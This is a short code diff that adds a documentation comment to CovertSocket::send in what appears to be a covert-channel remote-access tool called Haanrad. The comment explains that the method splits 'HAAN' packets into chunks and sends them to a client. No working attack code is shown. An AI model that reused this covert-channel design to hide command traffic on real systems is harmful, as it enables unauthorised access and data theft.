@@ -43,6 +43,12 @@ CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, 
 
 //covert socket send, does not need to know any context of where the request came from, Executor and FileSystemManager
 //will generate the appropriate response for the request they receive. CovertSocket just plows them out
+/**
+ * send is the main sending method used by Haanrad for sending messages to the client. The passed in HAAN packet is parsed
+ * into appropriate chunks depending on what packet type is selected and sent to the client. The method will hang until
+ * all pieces of the HAAN packet has been parsed up and sent
+ * @param payload String - the HAAN packet represented as a string to be parsed up and sent
+ */
 void CovertSocket::send(string payload) {
 
     //payload = {HAAN 00000000 data HAAN}\0
